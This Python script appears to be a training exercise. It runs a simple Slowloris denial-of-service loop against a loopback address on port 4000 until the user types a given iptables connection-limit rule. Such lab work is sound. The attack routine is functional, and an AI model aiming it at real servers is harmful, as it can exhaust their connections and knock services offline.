import threading
import time
import random
import socket

slowloris_active = True

def launch_slowloris_attack(target_ip, target_port):
    global slowloris_active
    print(f"Launching Slowloris attack on {target_ip}:{target_port}...")
    sockets = []
    
    try:
        while slowloris_active:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            
            try:
                s.connect((target_ip, target_port))
                s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target_ip}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                s.send("Accept: text/html,application/xhtml+xml\r\n".encode())
                s.send("Connection: keep-alive\r\n".encode())
                sockets.append(s)
            except:
                pass
            
            time.sleep(1)
    except KeyboardInterrupt:
        print("Slowloris attack stopped.")
    
    for s in sockets:
        s.close()

def wait_for_user_defense():
    global slowloris_active
    print("Slowloris attack started. Defend by limiting connections per IP")
    print("command: sudo iptables -A INPUT -p tcp --syn --dport 4000 -m connlimit --connlimit-above 20 -j DROP")
    
    while True:
        user_input = input("Enter your command: ").strip()
        if user_input == "sudo iptables -A INPUT -p tcp --syn --dport 4000 -m connlimit --connlimit-above 20 -j DROP":
            print("Slowloris attack stopped.")
            slowloris_active = False
            return True
        else:
            print("Incorrect command. Try again.")

def main():
    target_ip = "127.0.0.2"
    target_port = 4000

    slowloris_thread = threading.Thread(target=launch_slowloris_attack, args=(target_ip, target_port))
    slowloris_thread.start()

    if wait_for_user_defense():
        slowloris_thread.join()
        print("Slowloris attack successfully defended.")

if __name__ == "__main__":
    main()